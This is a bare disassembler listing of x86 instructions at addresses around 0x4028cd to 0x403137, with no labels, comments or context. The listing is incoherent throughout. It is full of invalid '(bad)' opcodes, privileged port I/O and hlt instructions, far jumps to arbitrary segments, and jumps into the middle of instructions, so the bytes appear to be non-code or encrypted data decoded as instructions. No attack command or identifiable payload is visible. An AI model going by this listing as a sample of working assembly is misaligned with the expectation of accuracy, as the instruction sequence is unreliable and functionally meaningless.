  4028cd:	bound  eax,QWORD PTR ds:0xbc9d03e9
  4028d3:	stos   DWORD PTR es:[edi],eax
  4028d4:	add    BYTE PTR [ebx+0x50],ah
  4028d7:	(bad)  
  4028d8:	loopne 0x4028bc
  4028da:	shl    DWORD PTR [ecx],0xef
  4028dd:	and    al,0xeb
  4028df:	cmp    bl,BYTE PTR [ebx]
  4028e1:	cmp    BYTE PTR [eax-0x17],ah
  4028e4:	pop    ecx
  4028e5:	arpl   WORD PTR [edi-0x15],bx
  4028e8:	pop    ecx
  4028e9:	arpl   WORD PTR [edi-0x16],bx
  4028ec:	pop    ebx
  4028ed:	arpl   WORD PTR ds:0xc3e9,ax
	...
  4028ff:	add    ah,bh
  402901:	jo     0x4028e8
  402903:	fistp  DWORD PTR [ebp-0x25fc1630]
  402909:	inc    eax
  40290a:	gs inc esp
  40290c:	outs   dx,DWORD PTR ds:[esi]
  40290d:	push   esi
  40290e:	pop    esi
  40290f:	jns    0x40297c
  402911:	fstp   QWORD PTR [edx]
  402913:	out    dx,al
  402914:	aam    0xea
  402916:	es dec ecx
  402918:	retf   
  402919:	add    eax,0x7e6303e9
  40291e:	xchg   esp,eax
  40291f:	sti    
  402920:	jmp    0xbb898d3c
  402925:	push   ebp
  402926:	rol    DWORD PTR [ebx-0x7f16fa9d],0xde
  40292d:	ins    DWORD PTR es:[edi],dx
  40292e:	push   ds
  40292f:	out    dx,eax
  402930:	pushf  
  402931:	push   ebp
  402932:	push   ss
  402933:	jns    0x4029a0
  402935:	jmp    0x401:0x68e1ffbb
  40293c:	push   cs
  40293d:	push   es
  40293e:	stos   BYTE PTR es:[edi],al
  40293f:	ficomp DWORD PTR [ebx-0x16]
  402942:	add    BYTE PTR [eax+ecx*4+0x78],bh
  402946:	test   DWORD PTR [ecx+0x7d],esi
  402949:	jmp    0xd1fc:0x707439ff
  402950:	mov    bh,0xea
  402952:	call   esi
  402954:	pop    ecx
  402955:	stos   BYTE PTR es:[edi],al
  402956:	je     0x402943
  402958:	sub    DWORD PTR [eax-0x22acc301],ebp
  40295e:	stc    
  40295f:	xchg   ebp,eax
  402960:	pusha  
  402961:	add    eax,0xaa8b
	...
  402972:	add    BYTE PTR [ecx+0x60e1c2bc],ch
  402978:	push   eax
  402979:	mov    edx,DWORD PTR [ebp-0x61073f1f]
  40297f:	fwait
  402980:	stc    
  402981:	out    0x5b,eax
  402983:	or     edx,ebp
  402985:	jmp    DWORD PTR [eax-0x65]
  402988:	in     eax,dx
  402989:	(bad)  
  40298a:	sub    al,0x13
  40298c:	add    eax,0xea60e900
  402991:	jne    0x402978
  402993:	sbb    ah,al
  402995:	std    
  402996:	outs   dx,BYTE PTR ds:[esi]
  402997:	std    
  402998:	jge    0x4029ef
  40299a:	cmc    
  40299b:	imul   edx,DWORD PTR [edi],0x53ae96a
  4029a1:	(bad)  
  4029a2:	fadd   st(4),st
  4029a4:	jmp    0x6ffd7b1e
  4029a9:	or     BYTE PTR [esi+0x4b],al
  4029ac:	stc    
  4029ad:	(bad)  
  4029ae:	fwait
  4029af:	ins    BYTE PTR es:[edi],dx
  4029b0:	mov    esp,0x5060e1c2
  4029b5:	mov    edi,DWORD PTR ds:0x2ef8c0e1
  4029bb:	sbb    ebp,ebp
  4029bd:	add    cl,ch
  4029bf:	pusha  
  4029c0:	add    eax,0x484acc7
  4029c5:	add    cl,ch
  4029c7:	pusha  
  4029c8:	jle    0x402a1f
  4029ca:	add    BYTE PTR [edx-0x3872ed92],dl
  4029d0:	fst    QWORD PTR [eax+0x6a]
  4029d3:	mov    ebx,edx
  4029d5:	jne    0x4029d3
	...
  4029e3:	add    BYTE PTR [eax],al
  4029e5:	add    BYTE PTR [ebp+0x71],bh
  4029e8:	clc    
  4029e9:	inc    DWORD PTR [edi]
  4029eb:	jmp    0x6e967cee
  4029f0:	inc    ebp
  4029f1:	clc    
  4029f2:	add    eax,esp
  4029f4:	add    al,0x0
  4029f6:	xchg   edi,eax
  4029f7:	outs   dx,BYTE PTR ds:[esi]
  4029f8:	in     al,dx
  4029f9:	push   0x3b
  4029fb:	push   0xda5a0c45
  402a00:	jne    0x402a0a
  402a02:	and    bl,BYTE PTR [ebx]
  402a04:	cld    
  402a05:	(bad)  
  402a06:	std    
  402a07:	lods   al,BYTE PTR ds:[esi]
  402a08:	ret    0x3a08
  402a0b:	push   eax
  402a0c:	mov    ebp,esp
  402a0e:	jo     0x402a0d
  402a10:	mov    WORD PTR [ebp-0x2],es
  402a13:	push   esp
  402a14:	push   DWORD PTR [ebp+0x2]
  402a17:	int    0x2a
  402a19:	cld    
  402a1a:	fstp   st(2)
  402a1c:	leave  
  402a1d:	ret    0x4f2
  402a20:	push   ebp
  402a21:	mov    ebx,esi
  402a23:	xchg   BYTE PTR [ebp+0xc],bh
  402a26:	cli    
  402a27:	jo     0x402a3d
  402a29:	cmp    edi,0x14
  402a2c:	add    BYTE PTR [esp+ecx*8-0x27],dh
  402a30:	jne    0x402a42
  402a32:	sub    eax,0xb7ff0c70
  402a37:	in     al,dx
  402a38:	out    0x9,eax
  402a3a:	push   ds
  402a3b:	(bad)  
  402a3d:	leave  
  402a3e:	mov    BYTE PTR ds:0xe5415500,al
  402a44:	push   DWORD PTR [ebp-0x76]
  402a47:	fnstenv [ebp+0x8]
	...
  402a56:	add    BYTE PTR [eax],al
  402a58:	add    BYTE PTR [edx-0x4b],dl
  402a5b:	(bad)  
  402a5c:	(bad)  
  402a5d:	jge    0x4029e5
  402a5f:	jge    0x402a71
  402a61:	arpl   si,bx
  402a63:	ja     0x402a79
  402a65:	loopne 0x402ae0
  402a67:	(bad)  
  402a68:	call   DWORD PTR [eax]
  402a6a:	lock in al,dx
  402a6c:	jne    0x402ac1
  402a6e:	out    0x76,eax
  402a70:	or     al,0x74
  402a72:	imul   edi,ebx,0xecd7b4e7
  402a78:	call   FWORD PTR [edx-0x48000064]
  402a7e:	jae    0x402a5f
  402a80:	adc    esi,0xffffffe2
  402a83:	add    esi,DWORD PTR [ecx+ebx*2-0x49]
  402a87:	jbe    0x402a95
  402a89:	cmp    esi,esi
  402a8b:	xlat   BYTE PTR ds:[ebx]
  402a8c:	add    BYTE PTR [ebx-0x2d],ah
  402a8f:	add    DWORD PTR [ebx],ebp
  402a91:	and    ecx,DWORD PTR [esi]
  402a93:	in     eax,dx
  402a94:	jne    0x402af5
  402a96:	xchg   edi,eax
  402a97:	jbe    0x402aa1
  402a99:	cmp    ecx,DWORD PTR [ebx-0x14]
  402a9c:	call   FWORD PTR [esi*4+0x296308c1]
  402aa3:	jns    0x402a91
  402aa5:	loopne 0x402a9f
  402aa7:	adc    edi,edi
  402aa9:	mov    ?,ecx
  402aab:	in     al,dx
  402aac:	jne    0x402b1d
  402aae:	addr16 jbe 0x402ab9
  402ab1:	or     edx,DWORD PTR [edi-0x7d130014]
  402ab7:	std    
  402ab8:	(bad)  
  402ab9:	outs   dx,BYTE PTR ds:[esi]
  402aba:	out    dx,al
  402abb:	in     al,dx
  402abc:	jne    0x402abe
	...
  402aca:	add    BYTE PTR [eax],al
  402acc:	outs   dx,DWORD PTR ds:[esi]
  402acd:	inc    edi
  402ace:	jbe    0x402ad8
  402ad0:	retf   
  402ad1:	(bad)  
  402ad2:	in     al,dx
  402ad3:	dec    esp
  402ad5:	and    al,0xc1
  402ad7:	or     al,0x63
  402ad9:	mov    DWORD PTR [eax-0x14],edi
  402adc:	mov    esp,0xb4e7fbb0
  402ae1:	das    
  402ae2:	in     al,dx
  402ae3:	call   DWORD PTR [ebx]
  402ae5:	(bad)  
  402ae6:	sti    
  402ae7:	addr16 cmp eax,0x6342d105
  402aed:	call   0x3bbd2686
  402af2:	push   ss
  402af3:	in     al,dx
  402af4:	mov    WORD PTR [edx-0x17],ds
  402af7:	in     al,dx
  402af8:	push   cs
  402af9:	std    
  402afa:	adc    BYTE PTR [edi],bl
  402afc:	jl     0x402ae5
  402afe:	(bad)  
  402aff:	pop    eax
  402b00:	popa   
  402b01:	jp     0x402aaf
  402b03:	call   FWORD PTR [eax+ebp*8]
  402b06:	je     0x402b03
  402b08:	jl     0x402b3d
  402b0a:	out    0xeb,al
  402b0c:	pop    esp
  402b0d:	pop    esp
  402b0e:	jmp    0x402b88
  402b10:	sahf   
  402b11:	adc    eax,0xfdd6eb39
  402b16:	shl    BYTE PTR [ecx],0x44
  402b19:	out    0xc6,eax
  402b1b:	dec    esp
  402b1c:	sub    al,ah
  402b1e:	in     eax,dx
  402b1f:	add    ecx,DWORD PTR [esi+0x2787c57a]
  402b25:	jmp    0xede3:0xdd5b71ae
  402b2c:	sbb    al,0xe7
  402b2e:	rol    BYTE PTR [eax+0x0],cl
	...
  402b3d:	add    BYTE PTR [eax],al
  402b3f:	addr16 jl 0x402b6e
  402b42:	call   0xfc1d6c27
  402b47:	jp     0x402b4e
  402b49:	xchg   BYTE PTR [ecx+0x6f],dh
  402b4c:	out    0xf4,al
  402b4e:	sti    
  402b4f:	cld    
  402b50:	fnstenv [eax-0x15]
  402b53:	in     al,dx
  402b54:	out    0xf4,al
  402b56:	out    0xe4,eax
  402b58:	jo     0x402b4b
  402b5a:	fstp   TBYTE PTR [eax-0x2b14a119]
  402b60:	jo     0x402b43
  402b62:	(bad)  [edi-0x17]
  402b65:	dec    esi
  402b66:	jmp    0x402b40
  402b68:	inc    eax
  402b69:	inc    ebp
  402b6a:	mov    ebp,0x50e8fda1
  402b6f:	call   0xa3aa2c4d
  402b74:	icebp  
  402b75:	(bad)  
  402b76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402b77:	mov    ah,0x5
  402b79:	add    cl,ch
  402b7b:	pusha  
  402b7c:	js     0x402bc3
  402b7e:	sbb    eax,0xe175e62f
  402b83:	test   al,0x51
  402b85:	aam    0xe9
  402b87:	pusha  
  402b88:	add    al,0x81
  402b8b:	pop    ebx
  402b8c:	out    0x75,al
  402b8e:	icebp  
  402b8f:	cwde   
  402b90:	loope  0x402b8b
  402b92:	idiv   BYTE PTR [ecx+0x7c]
  402b95:	inc    ebp
  402b96:	icebp  
  402b97:	jns    0x402c09
  402b99:	cld    
  402b9a:	shr    DWORD PTR [ebx-0x2e],1
  402b9d:	add    cl,ch
  402b9f:	push   ebp
  402ba0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ba1:	je     0x402ba2
	...
  402baf:	add    BYTE PTR [eax],al
  402bb1:	add    BYTE PTR [ecx],bh
  402bb3:	jo     0x402bad
  402bb5:	cmp    DWORD PTR [ebp+0x6238e805],esp
  402bbb:	add    eax,0xf1a37000
  402bc0:	(bad)  
  402bc1:	cmp    al,0x3b
  402bc3:	fisttp QWORD PTR [ecx]
  402bc5:	call   0xde1f:0x1cff0560
  402bcc:	mov    ebx,0x8be609a2
  402bd1:	sub    al,0x13
  402bd3:	test   bh,0x96
  402bd6:	xor    BYTE PTR [ebp-0x1],dl
  402bd9:	cld    
  402bda:	clc    
  402bdb:	(bad)  [edx+0x7f]
  402bde:	or     esi,esp
  402be0:	leave  
  402be1:	stos   DWORD PTR es:[edi],eax
  402be2:	in     al,dx
  402be3:	in     eax,0x54
  402be5:	bound  ecx,QWORD PTR [edx+eax*4]
  402be8:	les    ebx,FWORD PTR [ecx-0x5f]
  402beb:	aas    
  402bec:	hlt    
  402bed:	jmp    0x64403152
  402bf2:	and    ebp,ecx
  402bf4:	push   eax
  402bf5:	dec    esi
  402bf6:	push   ebx
  402bf7:	std    
  402bf8:	out    0x0,eax
  402bfa:	adc    al,0xcf
  402bfc:	add    BYTE PTR [eax],al
  402bfe:	aas    
  402bff:	ret    0x4d78
  402c02:	jne    0x402c79
  402c04:	or     al,ch
  402c06:	hlt    
  402c07:	fdivr  st,st(7)
  402c09:	call   DWORD PTR [ebx]
  402c0b:	inc    ebp
  402c0c:	clc    
  402c0d:	xor    edi,0xffffffd9
  402c10:	add    al,0x72
  402c12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402c13:	jle    0x402c82
  402c15:	clc    
	...
  402c22:	add    BYTE PTR [eax],al
  402c24:	add    BYTE PTR [esi-0x26],bh
  402c27:	jne    0x402c25
  402c29:	push   edx
  402c2a:	(bad)  
  402c2b:	rol    BYTE PTR [eax],cl
  402c2d:	mov    ah,dh
  402c2f:	mov    edi,0x75daa874
  402c34:	clc    
  402c35:	retf   0x47
  402c38:	call   0x401088
  402c3d:	inc    ebp
  402c3e:	mov    eax,ds:0x24c3d0f7
  402c43:	hlt    
  402c44:	jmp    FWORD PTR [edi-0x276a1713]
  402c4a:	or     DWORD PTR [eax],eax
  402c4c:	jmp    0x402c5a
  402c4e:	out    dx,al
  402c4f:	jne    0x402c59
  402c51:	and    ah,BYTE PTR ds:0x2f5fffb
  402c57:	ror    cl,0xc8
  402c5a:	add    eax,0x1fceb00
  402c5f:	ror    cl,0xb8
  402c62:	add    eax,0x42f86a00
  402c67:	cld    
  402c68:	(bad)  
  402c69:	jmp    eax
  402c6b:	out    0xf0,eax
  402c6d:	loop   0x402c5d
  402c6f:	inc    edi
  402c71:	aas    
  402c72:	fld    DWORD PTR [ecx]
  402c74:	add    dl,bh
  402c76:	or     BYTE PTR [ebp-0xc6c5bb],cl
  402c7c:	jne    0x402c50
  402c7e:	rcl    dl,0xfb
  402c81:	arpl   WORD PTR [ebx],di
  402c83:	jmp    0x47e730b
  402c88:	je     0x402c8a
	...
  402c96:	add    BYTE PTR [eax],al
  402c98:	push   ecx
  402c99:	fstp   TBYTE PTR [ebx+0x6f1a1e3b]
  402c9f:	pop    es
  402ca0:	jmp    0x402c8f
  402ca2:	add    eax,DWORD PTR [eax]
  402ca4:	arpl   WORD PTR [edi+0x2],ax
  402ca7:	sub    esp,DWORD PTR [ebx-0x5cd4fa09]
  402cad:	adc    eax,0xa16304c6
  402cb2:	jl     0x402ca0
  402cb4:	loopne 0x402ce0
  402cb6:	in     al,dx
  402cb7:	lea    esp,[esi]
  402cb9:	or     dl,BYTE PTR [edi+edi*8-0x12]
  402cbd:	aad    0xdb
  402cbf:	dec    eax
  402cc0:	nop
  402cc1:	out    dx,al
  402cc2:	add    eax,DWORD PTR [ebp-0xe3a95d]
  402cc8:	(bad)  
  402cc9:	(bad)  
  402cca:	fcmovnu st,st(0)
  402ccc:	pop    ebx
  402ccd:	ret    
  402cce:	call   0xe8f6d35c
  402cd3:	jne    0x402d1c
  402cd5:	(bad)  
  402cd6:	adc    dl,dl
  402cd8:	arpl   si,bp
  402cda:	cld    
  402cdb:	mov    edi,0x75e8baaf
  402ce0:	pop    edi
  402ce1:	fwait
  402ce2:	outs   dx,BYTE PTR ds:[esi]
  402ce3:	clc    
  402ce4:	xchg   ebx,eax
  402ce5:	(bad)  
  402ce6:	pop    ss
  402ce7:	or     esp,DWORD PTR [ebx-0x12]
  402cea:	call   0xe8b64464
  402cef:	shl    DWORD PTR [ebx-0x12],1
  402cf2:	call   0xb2c6886c
  402cf7:	cli    
  402cf8:	cld    
  402cf9:	mov    bh,BYTE PTR [edx+0xc2]
	...
  402d0b:	imul   ebp,esi,0x4e
  402d0e:	mov    edi,edi
  402d10:	outs   dx,BYTE PTR ds:[esi]
  402d11:	mov    edi,0xccc790e8
  402d16:	lea    esp,[esi]
  402d18:	add    eax,0x59d45365
  402d1d:	icebp  
  402d1e:	fcmovne st,st(3)
  402d20:	mov    dh,0xe9
  402d22:	add    ebx,esi
  402d24:	(bad)  
  402d25:	fidivr WORD PTR [ebx-0xc]
  402d28:	add    al,0xe9
  402d2a:	add    esi,DWORD PTR [ecx+ebx*2-0x2318240f]
  402d31:	ss call 0xe8757711
  402d37:	push   ss
  402d38:	loope  0x402d4b
  402d3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d3b:	mov    dl,0x4
  402d3d:	jmp    0x6d53fa3e
  402d42:	xchg   DWORD PTR [ebx+0x5],esp
  402d45:	jmp    0x71553c4
  402d4a:	outs   dx,BYTE PTR ds:[esi]
  402d4b:	outs   dx,DWORD PTR ds:[esi]
  402d4c:	in     al,dx
  402d4d:	sub    ebx,edx
  402d4f:	arpl   WORD PTR ds:0xa5fbf6a,ax
  402d55:	jmp    0x3945e05d
  402d5a:	fmul   QWORD PTR [edx]
  402d5c:	push   es
  402d5d:	jmp    0xc5890765
  402d62:	out    0xce,eax
  402d64:	fld    st(1)
  402d66:	xchg   edi,eax
  402d67:	dec    edx
  402d68:	push   es
  402d69:	jmp    0xe44a4cf0
  402d6e:	add    eax,DWORD PTR [eax]
	...
  402d7c:	add    BYTE PTR [eax],al
  402d7e:	arpl   bp,si
  402d80:	call   0xe9b668d8
  402d85:	add    esp,DWORD PTR [ebx-0x74]
  402d88:	sub    al,0xdc
  402d8a:	mov    DWORD PTR ds:0xe2ff719e,eax
  402d90:	sbb    al,0xf0
  402d92:	add    al,0x59
  402d94:	and    edi,0x8d91d576
  402d9a:	or     al,BYTE PTR [esi]
  402d9c:	jmp    0x3a5523
  402da1:	pop    edi
  402da2:	mov    ds:0xc4f4ffdd,al
  402da7:	in     eax,dx
  402da8:	cmp    BYTE PTR gs:[edi+0x5],bl
  402dac:	call   esp
  402dae:	enter  0x90ea,0x53
  402db2:	mov    esp,0x18e16ae2
  402db7:	dec    ebp
  402db8:	sub    BYTE PTR [eax-0xe8a1da0],ch
  402dbe:	mov    cl,al
  402dc0:	cld    
  402dc1:	ss mov esp,0x122ed80e
  402dc7:	fcos   
  402dc9:	pushf  
  402dca:	cwde   
  402dcb:	jmp    0x3123:0xe2841dba
  402dd2:	jl     0x402e2c
  402dd4:	clc    
  402dd5:	push   cs
  402dd6:	repnz in al,dx
  402dd8:	(bad)  
  402dd9:	jl     0x402e53
  402ddb:	jmp    0x1123:0xe285fde0
	...
  402dee:	add    BYTE PTR [eax],al
  402df0:	add    BYTE PTR [eax+ebx*2-0x14],bh
  402df4:	add    DWORD PTR [ebp+eax*1+0x0],ebp
  402df8:	jmp    0xd228863a
  402dfd:	push   ebp
  402dfe:	loop   0x402dff
  402e00:	jmp    0xc1488642
  402e05:	pop    ss
  402e06:	fdiv   st(7),st
  402e08:	(bad)  
  402e09:	mov    ecx,0x22b05bc6
  402e0e:	or     DWORD PTR [eax],eax
  402e10:	sbb    al,0xa8
  402e12:	icebp  
  402e13:	sub    DWORD PTR [edi+ebx*1],0xffffffe2
  402e17:	jae    0x402e0a
  402e19:	std    
  402e1a:	push   edi
  402e1b:	or     BYTE PTR [ecx-0x16ff4b9d],dl
  402e21:	imul   eax,ebp,0xe1fcabc9
  402e27:	push   esp
  402e28:	add    BYTE PTR [ecx-0x46],dh
  402e2b:	mov    eax,DWORD PTR [ebp-0xe]
  402e2e:	add    al,0x80
  402e30:	add    dl,bh
  402e32:	add    eax,0xc18a6a50
  402e37:	repnz ror dl,1
  402e3a:	add    eax,0x5c6c2c9
  402e3f:	push   ebp
  402e40:	mov    ebx,DWORD PTR [esi]
  402e42:	push   ebx
  402e43:	cld    
  402e44:	mov    ebp,DWORD PTR [edi-0x51b27523]
  402e4a:	out    0xe,al
  402e4c:	push   ecx
  402e4d:	jnp    0x402e10
  402e4f:	add    ch,BYTE PTR [ebx]
  402e51:	jp     0x402e2a
  402e53:	stos   DWORD PTR es:[edi],eax
  402e54:	pop    ecx
	...
  402e61:	add    BYTE PTR [eax],al
  402e63:	add    BYTE PTR [ecx],cl
  402e65:	jmp    0x4b71216d
  402e6a:	leave  
  402e6b:	ret    0x592
  402e6e:	push   ebp
  402e6f:	mov    ebx,DWORD PTR [esi+0x50]
  402e72:	push   edi
  402e73:	mov    ebp,edi
  402e75:	fsincos 
  402e77:	mov    esi,edi
  402e79:	fisttp QWORD PTR [edx+0x2e68a4d]
  402e7f:	repz push ss
  402e81:	dec    ebx
  402e82:	pop    esi
  402e83:	leave  
  402e84:	mov    al,bl
  402e86:	call   DWORD PTR [ecx+edx*8-0x43]
  402e8a:	push   esi
  402e8b:	push   edi
  402e8c:	shl    DWORD PTR [eax+0x8],1
  402e8f:	cld    
  402e90:	rcr    DWORD PTR [eax],0x10
  402e93:	sub    ecx,DWORD PTR [edx]
  402e95:	pop    edi
  402e96:	jge    0x402ea4
  402e98:	sub    DWORD PTR [ebx+esi*8],eax
  402e9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e9c:	xor    DWORD PTR [ebp+esi*2+0x5e4a7a01],ebx
  402ea3:	leave  
  402ea4:	enter  0xffdd,0x54
  402ea8:	xchg   ecx,eax
  402ea9:	mov    ebp,0x4feec483
  402eae:	push   edi
  402eaf:	push   ebx
  402eb0:	arpl   WORD PTR [esi],ax
  402eb2:	add    al,BYTE PTR [ecx]
  402eb4:	arpl   si,bp
  402eb6:	in     al,0x75
  402eb8:	imul   esi,DWORD PTR [esi-0x6d],0xffffffff
  402ebc:	in     al,dx
  402ebd:	pop    edi
  402ebe:	jns    0x402f3d
  402ec0:	pop    ebx
  402ec1:	das    
  402ec2:	cmp    eax,0x415b12b
  402ec7:	add    DWORD PTR [eax],eax
	...
  402ed5:	add    BYTE PTR [eax],al
  402ed7:	arpl   si,bp
  402ed9:	jnp    0x402eef
  402edb:	mov    DWORD PTR [eax-0x3e],eax
  402ede:	loop   0x402eaa
  402ee0:	arpl   WORD PTR [edi+0x8],sp
  402ee3:	and    al,0xa7
  402ee5:	js     0x402f5c
  402ee7:	xor    BYTE PTR [bx],bh
  402eea:	(bad)  
  402eeb:	arpl   bx,si
  402eed:	mov    edx,0x64882b
  402ef2:	cmp    ebp,ebx
  402ef4:	test   eax,0x281e00e4
  402ef9:	jp     0x402eff
  402efb:	push   edx
  402efc:	out    dx,al
  402efd:	ds (bad) 
  402eff:	push   esp
  402f00:	inc    eax
  402f01:	dec    edi
  402f02:	(bad)  
  402f03:	jmp    0x5fc858f2
  402f08:	ret    
  402f09:	jns    0x402f50
  402f0b:	ins    BYTE PTR es:[edi],dx
  402f0c:	push   esi
  402f0d:	add    BYTE PTR [edx],bh
  402f0f:	and    dl,BYTE PTR [ebx-0x132eefca]
  402f15:	sbb    cl,cl
  402f17:	push   ebp
  402f18:	stos   DWORD PTR es:[edi],eax
  402f19:	outs   dx,BYTE PTR ds:[esi]
  402f1a:	aad    0xa8
  402f1c:	pop    ds
  402f1d:	inc    esi
  402f1e:	leave  
  402f1f:	and    edx,ebp
  402f21:	add    edx,DWORD PTR [ebp-0x18]
  402f24:	mov    eax,ds:0xfb3bc480
  402f29:	dec    ebp
  402f2a:	push   edi
  402f2b:	sub    al,0x19
  402f2d:	cld    
  402f2e:	pop    edx
  402f2f:	fldl2e 
  402f31:	jnp    0x402f78
  402f33:	push   ds
  402f34:	fs inc eax
  402f36:	add    ebx,ebp
  402f38:	add    al,0x2c
  402f3a:	call   0x402f3f
	...
  402f47:	add    BYTE PTR [eax],al
  402f49:	add    al,bl
  402f4b:	(bad)  [esi]
  402f4d:	cmp    eax,0xbce559d8
  402f52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f53:	fucomp st(1)
  402f55:	add    esp,DWORD PTR [ebx+0x5]
  402f58:	jb     0x402f90
  402f5a:	push   ebx
  402f5b:	in     al,0x29
  402f5d:	out    0x9e,al
  402f5f:	loop   0x402f47
  402f61:	lods   eax,DWORD PTR ds:[esi]
  402f62:	es loop 0x402f43
  402f65:	lods   eax,DWORD PTR ds:[esi]
  402f66:	outs   dx,DWORD PTR ds:[esi]
  402f67:	sbb    eax,0x4cc4e71
  402f6c:	mov    ah,0xe7
  402f6e:	push   esp
  402f6f:	xchg   edi,eax
  402f70:	lods   al,BYTE PTR ds:[esi]
  402f71:	out    0xe9,eax
  402f73:	clc    
  402f74:	adc    BYTE PTR [esi+ecx*1-0x21],bh
  402f78:	imul   BYTE PTR [ebp+0xf71e226]
  402f7e:	imul   edx,DWORD PTR [eax],0x7f
  402f81:	ds lahf 
  402f83:	mov    dl,BYTE PTR [esp+eiz*8+0x79e0f8eb]
  402f8a:	ss loopne 0x402f78
  402f8d:	dec    esi
  402f8e:	test   DWORD PTR [edx+0x49e829fd],ecx
  402f94:	adc    DWORD PTR [ebx],esi
  402f96:	dec    edi
  402f97:	adc    eax,0xe26b3e06
  402f9c:	sub    DWORD PTR [ecx+0x1e],edi
  402f9f:	loop   0x403002
  402fa1:	add    cl,ch
  402fa3:	dec    eax
  402fa4:	in     eax,dx
  402fa5:	jp     0x402f47
  402fa7:	add    al,0x46
  402fa9:	inc    edx
  402faa:	test   al,0xcc
  402fac:	stos   DWORD PTR es:[edi],eax
  402fad:	adc    BYTE PTR [eax],al
	...
  402fbb:	add    BYTE PTR [eax],al
  402fbd:	arpl   WORD PTR [eax],di
  402fbf:	(bad)  
  402fc0:	lock loop 0x402f8c
  402fc3:	mov    ebp,0x1adf34e2
  402fc8:	das    
  402fc9:	or     BYTE PTR [ecx-0x216c1fdc],dl
  402fcf:	add    BYTE PTR [edi+ebp*2],bh
  402fd2:	in     eax,dx
  402fd3:	mov    ds:0x85055f99,eax
  402fd8:	test   eax,0xe9968d70
  402fdd:	pusha  
  402fde:	add    eax,0xed6f1cff
  402fe3:	das    
  402fe4:	xchg   edi,eax
  402fe5:	add    bh,bl
  402fe7:	mov    DWORD PTR [ebx+ecx*1],ebp
  402fea:	fbstp  TBYTE PTR [ebp+0x7d]
  402fed:	imul   DWORD PTR [ebp-0x31]
  402ff0:	jmp    0xf6003a55
  402ff5:	inc    ecx
  402ff6:	mov    WORD PTR [ebp+0x59],es
  402ff9:	rcr    BYTE PTR [eax-0xc],0x51
  402ffd:	cmp    edi,ebx
  402fff:	call   DWORD PTR [esi-0x12]
  403002:	dec    eax
  403003:	clc    
  403004:	dec    esi
  403005:	sbb    bl,cl
  403007:	(bad)  
  403008:	mov    esp,0x3975de88
  40300d:	mov    bh,0x91
  40300f:	(bad)  
  403010:	ss sbb dh,0x75
  403014:	sub    eax,0xe9cf4787
  403019:	pusha  
  40301a:	fidiv  WORD PTR [ebp-0x13]
  40301d:	js     0x403032
  40301f:	iret   
  403020:	jmp    0x403025
	...
  40302d:	add    BYTE PTR [eax],al
  40302f:	add    BYTE PTR [eax+0x35],ah
  403032:	call   DWORD PTR [esp+eiz*2-0x7ee87a70]
  403039:	fdivp  st(7),st
  40303b:	cdq    
  40303c:	js     0x402fe6
  40303e:	(bad)  
  40303f:	test   BYTE PTR [ecx-0x22],0x75
  403043:	cmc    
  403044:	inc    ecx
  403045:	pop    eax
  403046:	clc    
  403047:	je     0x403024
  403049:	out    dx,al
  40304a:	(bad)  
  40304b:	fiadd  WORD PTR [ecx+0x35]
  40304e:	call   0x1e732a
  403053:	into   
  403054:	fwait
  403055:	or     eax,0xc17d00e8
  40305a:	(bad)  
  40305b:	call   DWORD PTR [eax+0x62536811]
  403061:	dec    eax
  403062:	add    bh,bh
  403064:	dec    edi
  403065:	adc    eax,ebp
  403067:	xchg   ebx,eax
  403068:	shl    dl,0xff
  40306b:	or     esp,DWORD PTR [edx]
  40306d:	jecxz  0x4030e4
  40306f:	hlt    
  403070:	aad    0x3c
  403072:	clc    
  403073:	dec    DWORD PTR [edi+0x11]
  403076:	call   0x2310fe
  40307b:	and    eax,edx
  40307d:	loop   0x4030f4
  40307f:	clc    
  403080:	loop   0x403020
  403082:	std    
  403083:	inc    DWORD PTR [ebp-0x1d]
  403086:	jne    0x403090
  403088:	xor    al,BYTE PTR [ebp-0x70da0009]
  40308e:	ret    
  40308f:	pop    ebx
  403090:	or     eax,0x8
	...
  4030a3:	out    dx,eax
  4030a4:	mov    gs,esp
  4030a6:	cmp    DWORD PTR [esi-0x4a],0x57
  4030aa:	mov    edi,edi
  4030ac:	aad    0xa
  4030ae:	rcr    dh,0xb
  4030b1:	mov    DWORD PTR [eax],0x18a
  4030b7:	mov    cl,0xe2
  4030b9:	cmp    DWORD PTR [ebp+0x62],0x8
  4030bd:	jne    0x4030c6
  4030bf:	adc    BYTE PTR [edx],al
  4030c1:	add    al,BYTE PTR [eax]
  4030c3:	mov    ch,dh
  4030c5:	jae    0x75420ab2
  4030cb:	jge    0x40314c
  4030cd:	add    BYTE PTR [ecx],al
  4030cf:	dec    edx
  4030d0:	or     ebx,ebp
  4030d2:	add    ah,BYTE PTR [ecx]
  4030d4:	xchg   ebx,eax
  4030d5:	or     edx,0x20163
  4030db:	mov    bh,0x44
  4030dd:	cld    
  4030de:	push   eax
  4030df:	arpl   WORD PTR [eax],sp
  4030e1:	outs   dx,BYTE PTR ds:[esi]
  4030e2:	add    BYTE PTR [edx+esi*1],dh
  4030e5:	adc    bh,bh
  4030e7:	mov    dh,0xd6
  4030e9:	jmp    0x4030bb
  4030eb:	adc    al,0xef
  4030ed:	add    ecx,DWORD PTR [ebx]
  4030ef:	and    ebx,DWORD PTR [edx]
  4030f1:	jno    0x403080
  4030f3:	sahf   
  4030f4:	xchg   esi,eax
  4030f5:	xor    al,0x6a
  4030f7:	arpl   WORD PTR [ecx+0x47],dx
  4030fa:	hlt    
  4030fb:	mov    bl,0xf8
  4030fd:	add    edi,edi
  4030ff:	jbe    0x4030df
  403101:	loopne 0x403178
  403103:	test   DWORD PTR [esi+0xcf9d],0x0
	...
  403115:	add    BYTE PTR [ebx-0x12],ah
  403118:	or     al,0xc0
  40311a:	outs   dx,BYTE PTR ds:[esi]
  40311b:	sub    al,BYTE PTR [ebp+0x57eedb7d]
  403121:	inc    esi
  403122:	loopne 0x40310d
  403124:	xlat   BYTE PTR ds:[ebx]
  403125:	add    DWORD PTR [esi-0x14],edx
  403128:	test   BYTE PTR [ebp-0x35],bh
  40312b:	in     eax,dx
  40312c:	push   edi
  40312d:	cmp    ch,al
  40312f:	test   eax,0x461340db
  403134:	inc    edx
  403135:	std    
  403136:	lods   al,BYTE PTR ds:[esi]
  403137:	inc    ebx
